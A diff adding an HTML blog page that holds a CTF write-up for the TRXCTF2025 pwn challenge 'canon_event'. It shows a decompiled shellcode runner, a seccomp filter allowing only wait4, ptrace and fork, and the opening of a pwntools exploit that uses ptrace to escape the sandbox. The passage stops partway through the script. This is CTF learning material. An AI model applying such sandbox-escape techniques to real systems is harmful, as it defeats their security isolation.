@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>TRXCTF2025 - J4f&#39;s blog</title><meta name="author" content="J4f">
+<meta name="description" content="">
+  <meta itemprop="name" content="TRXCTF2025">
+  <meta itemprop="datePublished" content="2025-08-07T23:23:00+08:00">
+  <meta itemprop="dateModified" content="2025-08-07T23:39:42+08:00">
+  <meta itemprop="wordCount" content="1433">
+  <meta itemprop="keywords" content="WP"><meta property="og:url" content="http://localhost:1313/posts/trxctf2025/">
+  <meta property="og:site_name" content="J4f&#39;s blog">
+  <meta property="og:title" content="TRXCTF2025">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-07T23:23:00+08:00">
+    <meta property="article:modified_time" content="2025-08-07T23:39:42+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TRXCTF2025">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/1.jpg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/trxctf2025/" title="TRXCTF2025 - J4f&#39;s blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/read_fzdxj/" title="《法治的细节》" /><link rel="next" type="text/html" href="http://localhost:1313/posts/phppwn_re_struct/" title="phppwn逆向" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/trxctf2025/index.md" title="TRXCTF2025 - J4f's blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "TRXCTF2025",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/trxctf2025\/"
+    },"genre": "posts","wordcount":  1433 ,
+    "url": "http:\/\/localhost:1313\/posts\/trxctf2025\/","datePublished": "2025-08-07T23:23:00+08:00","dateModified": "2025-08-07T23:39:42+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "J4f"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="J4f&#39;s blog"><span class="typeit"><template>J4f&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="J4f&#39;s blog"><span class="typeit"><template>J4f&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>TRXCTF2025</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img class="avatar" src='/1.jpg' alt="J4f" height="16" width="16">&nbsp;J4f</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/wp/" class="post-category" title="Category - WP"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> WP</a></span></div><div class="post-meta-line"><span title="published on 2025-08-07 23:23:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-08-07">2025-08-07</time></span>&nbsp;<span title="Updated on 2025-08-07 23:39:42"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-08-07">2025-08-07</time></span>&nbsp;<span title="1433 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#canon_event">canon_event</a></li>
+    <li><a href="#virtual_insanity">Virtual_Insanity</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 class="heading-element" id="canon_event"><span>canon_event</span>
+  <a href="#canon_event" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><blockquote>
+<p>ptrace + 沙箱绕过</p>
+</blockquote>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// rax
+</span></span></span><span class="line"><span class="cl">  <span class="kt">void</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// r12
+</span></span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">uint</span><span class="p">;</span> <span class="c1">// ebp
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xDEAD000</span><span class="p">,</span> <span class="mh">0x1000u</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xDEAE000</span><span class="p">,</span> <span class="mh">0x1000u</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">-</span><span class="mi">1LL</span> <span class="o">||</span> <span class="p">(</span><span class="n">v5</span> <span class="o">=</span> <span class="n">v4</span><span class="p">,</span> <span class="n">v4</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">-</span><span class="mi">1LL</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;mmap failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;code size: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">uint</span> <span class="o">=</span> <span class="nf">get_uint</span><span class="p">();</span>                            <span class="c1">// 输入shellcode长度
+</span></span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">uint</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>                          <span class="c1">// shellcode长度大于0x1000就报错
+</span></span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;invalid code size&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;enter shellcode: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="n">uint</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>                  <span class="c1">// 读入shellcode
+</span></span></span><span class="line"><span class="cl">    <span class="nf">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;read failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">mprotect</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="mh">0x1000u</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>           
+</span></span><span class="line"><span class="cl">    <span class="nf">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;mprotect failed&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">isolate_and_jump</span><span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="n">_QWORD</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="p">))</span><span class="n">v3</span><span class="p">,</span> <span class="n">v5</span><span class="p">);</span> <span class="c1">//开sandbox，然后去执行shellcode
+</span></span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-shell"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> line  CODE  JT   JF      <span class="nv">K</span>
+</span></span><span class="line"><span class="cl"><span class="o">=================================</span>
+</span></span><span class="line"><span class="cl"> 0000: 0x20 0x00 0x00 0x0000000c  <span class="nv">A</span> <span class="o">=</span> instruction_pointer &gt;&gt; <span class="m">32</span>
+</span></span><span class="line"><span class="cl"> 0001: 0x35 0x04 0x00 0x00008000  <span class="k">if</span> <span class="o">(</span>A &gt;<span class="o">=</span> 0x8000<span class="o">)</span> goto <span class="m">0006</span>
+</span></span><span class="line"><span class="cl"> 0002: 0x20 0x00 0x00 0x00000000  <span class="nv">A</span> <span class="o">=</span> sys_number
+</span></span><span class="line"><span class="cl"> 0003: 0x15 0x02 0x00 0x0000003d  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> wait4<span class="o">)</span> goto <span class="m">0006</span>
+</span></span><span class="line"><span class="cl"> 0004: 0x15 0x01 0x00 0x00000065  <span class="k">if</span> <span class="o">(</span><span class="nv">A</span> <span class="o">==</span> ptrace<span class="o">)</span> goto <span class="m">0006</span>
+</span></span><span class="line"><span class="cl"> 0005: 0x15 0x00 0x01 0x00000039  <span class="k">if</span> <span class="o">(</span>A !<span class="o">=</span> fork<span class="o">)</span> goto <span class="m">0007</span>
+</span></span><span class="line"><span class="cl"> 0006: 0x06 0x00 0x00 0x7fff0000  <span class="k">return</span> ALLOW
+</span></span><span class="line"><span class="cl"> 0007: 0x06 0x00 0x00 0x80000000  <span class="k">return</span> KILL_PROCESS</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>只允许三个系统调用：wait4、ptrace、fork</p>
+<p>exp:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-python"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;tmux&#34;</span><span class="p">,</span> <span class="s2">&#34;splitw&#34;</span><span class="p">,</span> <span class="s2">&#34;-h&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dbg</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># DOCKER_PORT = 1337</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># REMOTE_NC_CMD    = &#34;nc localhost 444&#34;    # `nc &lt;host&gt; &lt;port&gt;`</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">bstr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ELF</span><span class="o">.</span><span class="n">binsh</span> <span class="o">=</span> <span class="k">lambda</span> <span class="bp">self</span><span class="p">:</span> <span class="nb">next</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">GDB_SCRIPT</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">set follow-fork-mode child
+</span></span></span><span class="line"><span class="cl"><span class="s2">set follow-exec-mode same
+</span></span></span><span class="line"><span class="cl"><span class="s2">c
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">PTRACE_CONT</span> <span class="o">=</span> <span class="mi">7</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PTRACE_GETREGS</span> <span class="o">=</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PTRACE_SETREGS</span> <span class="o">=</span> <span class="mi">13</span>
